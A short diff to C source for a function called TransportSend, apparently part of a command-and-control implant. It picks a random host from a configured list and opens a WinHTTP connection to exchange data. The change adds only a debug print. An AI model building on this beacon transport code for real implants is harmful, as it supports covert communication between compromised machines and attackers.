@@ -259,11 +259,11 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
         HttpHost = Instance->Config.Transport.Hosts[ RandomNumber32() % Counter ];
     }
 
+    PRINTF( "WinHttpConnect( %x, %ls, %d, 0 )\n", hSession, HttpHost, Instance->Config.Transport.Port )
     hConnect = Instance->Win32.WinHttpConnect( hSession, HttpHost, Instance->Config.Transport.Port, 0 );
     if ( ! hConnect )
     {
         PRINTF( "WinHttpConnect: Failed => %d\n", NtGetLastError() )
-
         Successful = FALSE;
         goto LEAVE;
     }
